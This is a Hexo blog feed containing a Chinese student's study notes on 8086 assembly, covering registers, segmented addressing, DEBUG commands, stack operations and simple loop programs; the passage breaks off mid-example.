{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/11/01/%E6%B1%87%E7%BC%96/",
            "url": "http://example.com/2022/11/01/%E6%B1%87%E7%BC%96/",
            "title": "汇编",
            "date_published": "2022-11-01T05:38:45.000Z",
            "content_html": "<h1 id=\"汇编\"><a class=\"markdownIt-Anchor\" href=\"#汇编\">#</a> 汇编</h1>\n<p>1. 汇编语言组成</p>\n<p>汇编指令 ，伪指令，其他符号</p>\n<p>2. 汇编不区分大小写</p>\n<p>3. 数据总线，控制总线，地址总线 – 外部总线</p>\n<h2 id=\"寄存器cpu\"><a class=\"markdownIt-Anchor\" href=\"#寄存器cpu\">#</a> 寄存器（CPU）</h2>\n<p>CPU 由运算器，控制器，寄存器组成，靠内部总线相连</p>\n<p>8086 有 14 个寄存器，它们的名称为 AB,BX,CX,DX，SI，DI，SP，BP，IP，CS，SS，DS，ES，PSW，都是 16 位</p>\n<p>AX,BX,CX,DX 为通用结存器，最大可以存储 2^16-1</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009203327558.png\" alt=\"image-20221009203327558\" style=\"zoom:50%;\" />\n<p>每个又可以分为 H 和 L，比如 AH 和 AL，可以分开独立使用</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009204003372.png\" alt=\"image-20221009204003372\" style=\"zoom:50%;\" />\n<p>1word = 2 Byte</p>\n<p>16 位 CPU 特征：1. 运算器一次最多处理 16 位 2，寄存器最大宽度为 16 位 3. 寄存器和运算器之间通路 16 位</p>\n<p>由于 cpu 内部总线是 16 位，但外部总线是 20 位</p>\n<p>8086 内部使用两个 16 位内部地址来将器变为 20 位</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009211023097.png\" alt=\"image-20221009211023097\" style=\"zoom:50%;\" />\n<p>第一个地址为段地址，第二个为偏移地址 ，通过地址加法器变为 20 位</p>\n<p>物理地址 = 段地址 * 16 + 偏移地址</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009211420365.png\" alt=\"image-20221009211420365\" style=\"zoom:50%;\" />\n<p>即地址左移四位，每次左移一位，对应的 16 进制和 10 进制就 * 2，因为地址是二进制</p>\n<p>扩展：一个 x 进制左移一位就 * x</p>\n<p>段地址长度可以自己指定，一个段的最大长度为 64kb，起始地址一定为 16 的倍数</p>\n<p>一个物理地址可以有很多种段地址和偏移地址的组合</p>\n<p>2000:1F60 数据在 21F60 中</p>\n<p>段寄存器 CS，DS，SS，ES</p>\n<p>CS：代码地址</p>\n<p>DS：数据地址</p>\n<p>SS：堆栈地址</p>\n<p>IP：指令指针寄存器</p>\n<p>修改 CS IP 中内容使用</p>\n<p>jmp 段地址：偏移地址</p>\n<p>jmp ax   // 仅修改 IP 内容，参数为合法寄存器，类似于 mov IP，AX</p>\n<p>8086cpu 工作过程</p>\n<p>1.CS:IP 指向内存单元读取执行，读取执行进入指令缓冲器</p>\n<p>2.IP 指向下一条指令</p>\n<p>3. 执行指令，重复到 1</p>\n<p>初始 CS=2000H，IP=0000H</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010210638345.png\" alt=\"image-20221010210638345\" style=\"zoom:50%;\" />\n<p>mov ax 6622</p>\n<p>jmp 1000:3</p>\n<p>mov ax,0000</p>\n<p>mov bx,ax</p>\n<p>jmp bx</p>\n<p>mov ax,0123</p>\n<p>mov ax,0000</p>\n<p>… 死循环</p>\n<p>代码段</p>\n<p>将 &lt;=64kb 的一组代码，起始地址为 16 倍数的内存单元作为一个代码段</p>\n<p>通过 CS：IP 指向代码段首地址来执行代码段</p>\n<p>DEBUG</p>\n<p>用 Debug 的 R 命令查看、改变 CPU 寄存器的内容；</p>\n<p>用 Debug 的 D 命令查看内存中的内容；</p>\n<p>用 Debug 的 E 命令改写内存中的内容；</p>\n<p>用 Debug 的 U 命令将内存中的机器指令翻译成汇编指令；</p>\n<p>用 Debug 的 T 命令执行一条机器指令；</p>\n<p>用 Debug 的 A 命令以汇编指令的格式在内存中写入一条机器指令。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213213522.png\" alt=\"image-20221010213213522\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213504618.png\" alt=\"image-20221010213504618\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213716733.png\" alt=\"image-20221010213716733\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213841925.png\" alt=\"image-20221010213841925\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010214052414.png\" alt=\"image-20221010214052414\"></p>\n<p>fff0:0 ff 可以查看 rom 时间</p>\n<p>b810:0 可以修改显存</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221011204621998.png\" alt=\"image-20221011204621998\" style=\"zoom:50%;\" />\n<p>1 地址字单元存放的字型数据时 124EH</p>\n<p>可以将 N 和 N+1 两个单元看成一个字单元</p>\n<h2 id=\"寄存器内存\"><a class=\"markdownIt-Anchor\" href=\"#寄存器内存\">#</a> 寄存器（内存）</h2>\n<p>MOV al,[0]  // 将偏移地址为 0 的内存单元送到 AL 寄存器中</p>\n<p>不能把立即数直接送入段寄存器 ，需要经过通用寄存器中转</p>\n<p>数据 -》通用寄存器 -》段寄存器</p>\n<p>将数据从寄存器送入内存单元</p>\n<p>mov bx,1000H</p>\n<p>mov ds,bx</p>\n<p>mov [0],al</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221011210109223.png\" alt=\"image-20221011210109223\" style=\"zoom:50%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221011210150336.png\" alt=\"image-20221011210150336\" style=\"zoom:50%;\" />\n<p>-e 1000:0 23 11 22 66</p>\n<p>1122 8833 8833</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012084245812.png\" alt=\"image-20221012084245812\" style=\"zoom:50%;\" />\n<p>2c34</p>\n<p>1B12   -d 1000:0</p>\n<p>0000</p>\n<p>mov 指令</p>\n<blockquote>\n<p>mov 寄存器，数据</p>\n<p>mov 寄存器，寄存器</p>\n<p>mov 寄存器，内存单元   mov ax,[0]</p>\n<p>mov 内存单元，客存器   mov [0],ax</p>\n<p>mov 段寄存器，寄存器</p>\n<p>mov 寄存器，段寄存器</p>\n</blockquote>\n<p>add，sub</p>\n<blockquote>\n<p>add 寄存器，数据</p>\n<p>add 寄存器，寄存器</p>\n<p>add 寄存器，内存单元</p>\n<p>add 内存单元，寄存器</p>\n<p>sub 寄存器，数据</p>\n<p>sub 寄存器，寄存器</p>\n<p>sub 寄存器，内存单元</p>\n<p>sub 内存单元，寄存器</p>\n</blockquote>\n<p>add,sub 不能使用段寄存器为参数</p>\n<p>数据段：长度为 N 的地址连续，起始地址为 16 倍数的内存单元定义为存储数据的内存空间</p>\n<p>将 123B0-123BA 的前三个单元的字节型数据累加</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012212730685.png\" alt=\"image-20221012212730685\" style=\"zoom:50%;\" />\n<p>累加字型数据</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012213223456.png\" alt=\"image-20221012213223456\" style=\"zoom:50%;\" />\n<p>[address] 表示一个偏移地址为 address 的内存单元</p>\n<p><img data-src=\"../AppData/Roaming/Typora/typora-user-images/image-20221012214721228.png\" alt=\"image-20221012214721228\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012214843733.png\" alt=\"image-20221012214843733\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012215020183.png\" alt=\"image-20221012215020183\"></p>\n<p>即 [0] 073F 和 073F [0] 会将 073f 当做偏移地址，验证：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012215201456.png\" alt=\"image-20221012215201456\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012215301128.png\" alt=\"image-20221012215301128\"></p>\n<h4 id=\"栈\"><a class=\"markdownIt-Anchor\" href=\"#栈\">#</a> 栈</h4>\n<p>8086 提供的入栈和出栈 push,pop</p>\n<p>push ax 将寄存器 ax 中的数据送入栈中</p>\n<p>pop ax 从栈顶取出数据送入 ax</p>\n<p>通过段寄存器 SS 存放栈顶的段地址，sp 存放栈顶偏移地址，任意时刻，SS:SP 指向栈顶元素</p>\n<p>push ax sp=sp-2,SS:SP 指向新栈顶，放入数据</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013193051835.png\" alt=\"image-20221013193051835\" style=\"zoom:50%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013193356305.png\" alt=\"image-20221013193356305\" style=\"zoom:50%;\" />\n<blockquote>\n<p>任意时刻・SS:SP 指向栈顶元素。当栈为空的时候，栈中没有元素，也就不存在栈项元素<br>\n所 SS:SP 只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址 + 2<br>\n 栈最底部字单元的地址为 1000:000E，所以栈空时 SP=0010H</p>\n</blockquote>\n<p>pop ax  将数据送入 ax 中，SP=SP+2，数据仍在内存中，下一次 push 或其他写入数据的操作时会覆盖</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013194330665.png\" alt=\"image-20221013194330665\" style=\"zoom:50%;\" />\n<p>push 和 pop 可以操作段寄存器，通用寄存器，内存单元</p>\n<p>push ax</p>\n<p>push ds</p>\n<p>push [0]</p>\n<h4 id=\"栈顶越界\"><a class=\"markdownIt-Anchor\" href=\"#栈顶越界\">#</a> 栈顶越界</h4>\n<p>栈满 push，栈空 pop 产生越界</p>\n<p>栈满 push 会导致溢出覆盖栈外的数据</p>\n<p>栈空 pop 会将别的数据放入寄存器中产生溢出</p>\n<p>8086CPU 中没有检测的机制，需要自己注意…</p>\n<h4 id=\"练习\"><a class=\"markdownIt-Anchor\" href=\"#练习\">#</a> 练习</h4>\n<p>将 10000H~1000FH 这段空间当作栈，初始状态是空的，将 AX,BX,DS 中的数据入栈</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,0010</p>\n<p>push ax</p>\n<p>push bx</p>\n<p>push ds</p>\n<p>(1）将 10000H~1000FH 这段空间当作栈，初始状态是空的；</p>\n<p>(2）设置 AX=001AH，BX=001BH;</p>\n<p>(3）将 AX，BX 中的数据入栈</p>\n<p>(4）然后将 AX，BX 清零；</p>\n<p>(5）从栈中恢复 AX，BX 原来的内容。</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,0010</p>\n<p>mov ax,001A</p>\n<p>mov bx,001B</p>\n<p>push ax</p>\n<p>push bx</p>\n<p>mov ax,0   // 使用 sub ax,ax 只使用两个字节，mov ax,0 机器码需要三个字节，也可以使用 xor ax,ax</p>\n<p>mov bx,0</p>\n<p>pop bx</p>\n<p>pop ax</p>\n<p>(1)   将 10000H~1000FH 这段空间当栈，初始状态是空的；</p>\n<p>(2）设置 AX=002AH ，BX=002BH;</p>\n<p>(3）利用栈交换 AX 和 BX 中的数据。</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,0010</p>\n<p>mov ax,002A</p>\n<p>mov bx,002B</p>\n<p>push ax</p>\n<p>push bx</p>\n<p>pop ax</p>\n<p>pop bx</p>\n<p>我们如果要在 10000H 处写入字型数据 2266H, 可以用以下的代码完成︰</p>\n<p>mov ax,1000H</p>\n<p>mov ds,ax</p>\n<p>mov ax,2266H</p>\n<p>mov [0],ax</p>\n<p>补在 10000H 处写入字型数据 2266H</p>\n<p>mov ax,1000</p>\n<p>mov ss,ax</p>\n<p>mov sp,2   //push 之前先 - 2，在放输入，2-2=0</p>\n<p>mov ax,2266</p>\n<p>push ax</p>\n<p>要求，不能用 mov 内存单元，寄存器这类指令</p>\n<p>push，pop 实质上是一种内存传送指令，push，pop 访问的内存单元的地址是由 ss:sp 指出的</p>\n<p>pop，pop 栈操作只修改 sp，sp 最大变化范围为 0-FFFF</p>\n<p>如果我们将 10000H~1FFFFH 这段空间当作栈段，初始状态是空的，比时 SS=1000H，SP=0</p>\n<p>栈顶变化范围为 0-FFFFH，栈空 sp=0，一直压栈，栈满后 sp=0，再次压栈，栈顶将环绕，覆盖原来内容</p>\n<p>对于代码段，数据段，栈段，cpu 通过 CS DS SS 区分</p>\n<p>CS:IP</p>\n<p>SS:SP</p>\n<p>DS:[0]</p>\n<h2 id=\"程序编写\"><a class=\"markdownIt-Anchor\" href=\"#程序编写\">#</a> 程序编写</h2>\n<p>1. 编写汇编程序，后缀为.asm</p>\n<p>2. 编译 masm.exe 连接 link.exe</p>\n<p>3. 执行可执行文件，有程序和数据两部分，操作系统加可执行文件中的机器码和数据加载入内存，进行初始化</p>\n<p>源程序</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015201813041.png\" alt=\"image-20221015201813041\" style=\"zoom:50%;\" />\n<p>汇编指令上图中 mov，add，int 等</p>\n<p>伪指令上图中 assume codesg，没有对应的机器码，不被 cpu 执行，被编译器执行</p>\n<p>定义一个段</p>\n<p>segment 和 ends 是一对成对的伪指令，定义一个段 segment 开始，ends 结束</p>\n<p>格式:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">段名 segment </span><br><span class=\"line\">段名 ends</span><br></pre></td></tr></table></figure>\n<p>一个汇编程序由多个段组成</p>\n<p>ends 是汇编程序结束标记</p>\n<p>assume 假设寄存器和段关联，CS:codesg，假设代码段的名称为 codesg</p>\n<p>将源程序文件中内容称为源程序，编译后称为程序，程序放在可执行文件中 PE</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015203100625.png\" alt=\"image-20221015203100625\" style=\"zoom:50%;\" />\n<p>标号 一个标号指代一个地址，codesg</p>\n<p>编程运算 2^3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:abc</span><br><span class=\"line\">abc segent</span><br><span class=\"line\">mov ax,2</span><br><span class=\"line\">add ax,ax</span><br><span class=\"line\">add ax,ax</span><br><span class=\"line\">abc ends</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n<p>DOS 是一个单任务操作系统，一个程序结束后，将 CPU 控制权交还给使他运行的程序，称为返回</p>\n<p>返回 程序段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,4c00H</span><br><span class=\"line\">int 21H</span><br></pre></td></tr></table></figure>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221015204512894.png\" alt=\"image-20221015204512894\" style=\"zoom:50%;\" />\n<p>masm.exe 1.asm</p>\n<p>link 1.obj</p>\n<p>可以在命令后加上；简化编译和连接</p>\n<p>连接：源程序很大时将他分为多个源程序编译，成文目标文件后在连接到一起。将库文件和程序的目标文件连接在一起才可以生成可执行文件</p>\n<p>在 DOS 中运行 1.exe 时，DOS 的 command 将 1.exe 加载进入内存，command 设置 CPU 的 cs:IP 指向程序的第一条指令，从而得以使程序运行。</p>\n<p>程序运行结束后，返回到 command 中，cpu 继续执行 command</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221016204217510.png\" alt=\"image-20221016204217510\" style=\"zoom:67%;\" />\n<p>Debug 将程序加载进入内存，当不放弃对 cpu 控制，使用中断实现</p>\n<p>有入口的程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg</span><br><span class=\"line\">    codesg segment</span><br><span class=\"line\">    start:\tmov ax,0123H</span><br><span class=\"line\">    \t\tadd bx,0456H</span><br><span class=\"line\">    \t\tadd ax,bx</span><br><span class=\"line\">    \t\tadd ax,ax</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\tmov ax,4c00H</span><br><span class=\"line\">\t\t\tint 21H</span><br><span class=\"line\">    \t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>debug 将程序 exe 加载入内存后 cx，存放程序长度</p>\n<p>程序加载后，ds 中放着程序所在内存区的段地址，这个内存区的偏移地址为 0，这个内存区的前 256 个字节存放的是 psp，dos 用来和程序进行通信，从 256 字节以后存放的是程序</p>\n<p>psp 的段地址 SA，偏移地址为 0，表示为 SA+10:0</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221016211036041.png\" alt=\"image-20221016211036041\" style=\"zoom:50%;\" />\n<p>指定到 int 21 时用 p 执行，此时程序 terminated</p>\n<p>使用 q 结束 debug，回到 command 中，因为 debug 由 command 加载</p>\n<h2 id=\"bxloop\"><a class=\"markdownIt-Anchor\" href=\"#bxloop\">#</a> [bx]&amp;loop</h2>\n<p>bx:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:codesg</span><br><span class=\"line\">    codesg segment</span><br><span class=\"line\">    start:\tmov ax,2000</span><br><span class=\"line\">    \t\tmov ds,ax</span><br><span class=\"line\">    \t\tmov al,[0]</span><br><span class=\"line\">    \t\tmov bl,[1]</span><br><span class=\"line\">    \t\tmov cl,[2]</span><br><span class=\"line\">    \t\tmov dl,[3]</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\tmov ax,4c00H</span><br><span class=\"line\">\t\t\tint 21H</span><br><span class=\"line\">    \t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>实际来说，CPU 并不认编译器的 [0] 这种东西，他会认成 0</p>\n<p>但 debug 中 [0] 可以正常作为偏移地址</p>\n<p>[bx] 表示一个内存单元，偏移地址在 bx 中</p>\n<p>mov bx,0   // 将 0 给 bx</p>\n<p>mov ax,[bx]   // 此时 bx 是偏移地址</p>\n<p>段地址 SA，偏移地址 EA  SA：EA</p>\n<p>() 的含义</p>\n<p>ax 中的内容为 0010，那么 (ax)=0010</p>\n<p>2000:1000 处的内容为 0010，(21000H)=0010</p>\n<p>mov ax,[2] (ax)=((dx)*16+2)</p>\n<p>idata 含义：</p>\n<p>idata 表示常量</p>\n<p>mov ax,[idata] 代表 Mov ax,[0]  Mov ax,[2]  Mov ax,[3]  d = 等</p>\n<p>inc bx    //bx++</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221017094727684.png\" alt=\"image-20221017094727684\" style=\"zoom:67%;\" />\n<p>ax 00be</p>\n<p>bx 1002</p>\n<p>内存中 00be 00be</p>\n<p>bx 1004</p>\n<p>内存中 00be 00be 00be</p>\n<p>内存中从左到右为从低到高</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221017094440863.png\" alt=\"image-20221017094440863\"></p>\n<p>内存中 00be 00be 00be be 00</p>\n<p>Loop</p>\n<p>loop 标号</p>\n<p>执行 loop 时 CPU 操作</p>\n<p>1.(cx)=(cx)-1</p>\n<p>2. 判断 cx 中的值，不为 0 跳至标号处执行，为 0 向下执行</p>\n<p>即一般 cx 中存放循环次数</p>\n<p>使用 loop 计算 2^2</p>\n<p>mov ax,2</p>\n<p>add ax,ax</p>\n<p>计算 2^12</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,2</span><br><span class=\"line\">\t\tmov cx,11</span><br><span class=\"line\">s: \t\tadd ax,ax</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>注意：debug 默认 16 进制，masm 默认十进制</p>\n<p>loop 相当于 do … while …</p>\n<p>计算 123*236 时使用 236+123 次，减少循环次数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0</span><br><span class=\"line\">\t\tmov cx,123</span><br><span class=\"line\">s: \t\tadd ax,236</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>汇编时数据不能以字母开头，要在前面 + 0</p>\n<p>debug g 命令和 p 命令</p>\n<p>将 ffff:0006 单元中的数据 * 123，结果存在 dx 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,6</span><br><span class=\"line\">\t\tmov ax,[bx]</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov dx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,123</span><br><span class=\"line\">s:\t\tadd dx,ax</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>g 0014   // 直接执行到 IP 为 0014 的位置</p>\n<p>p 直接执行到循环结束，如果不是 21H 的位置输入</p>\n<p>在程序中</p>\n<p>mov al, ds:[0]    // == mov bx,0  mov al,[bx], == mov al,[0]</p>\n<p>累加 [0]-[b] 的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov dx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,12</span><br><span class=\"line\">s:\t\tmov al,ds:[cs]</span><br><span class=\"line\">\t\tmov ah,0</span><br><span class=\"line\">\t\tadd dx,ax</span><br><span class=\"line\">\t\tinc bx</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>段前缀</p>\n<p>mov ax,cs:[0]    //cs 为段前缀</p>\n<p>一般类似或 0:200-0:2ff 不会有数据和指令，是一段安全的空间</p>\n<p>将内存 ffff:0<sub>ffff:b 段元中的数据拷贝到 0:200</sub>0:20b 单元中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,0ffffh</span><br><span class=\"line\">\t\tmov ds,ax  ;ds中是内存ffff:0中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,0020h</span><br><span class=\"line\">\t\tmov es,ax  ;es是内存20:0中的数据</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov bx,0   ;bx中为内存偏移值</span><br><span class=\"line\">\t\tmov cx,12  ;为循环判断条件</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tmov dl,ds:[bx]</span><br><span class=\"line\">\t\tmov es:[bx],dl</span><br><span class=\"line\">\t\tinc bx</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">        mov ax,4c00h</span><br><span class=\"line\">        int 21h</span><br><span class=\"line\">\t</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<h2 id=\"多个段的程序\"><a class=\"markdownIt-Anchor\" href=\"#多个段的程序\">#</a> 多个段的程序</h2>\n<p>我们是不能自己随便决定哪段空间可以使用的，应该让系统来为我们分配。<strong>我们可以在程序中</strong>，定义我们希望处理的数据，这些数据就会被编译、连接程序作为程序的一部分写到可执行文件中。当可执行文件中的程序被加载入内存时，这些数据也同时被加载入内存中。与此同时，我们要处理的数据也就自然而然地获得了存储空间。</p>\n<p>dw define word 定义字型数据，在代码段中定义数据，此时代码 的起始位置是数据之后</p>\n<p>db 定义字节型数据</p>\n<p>数据之间用，分隔</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">\t\tdw 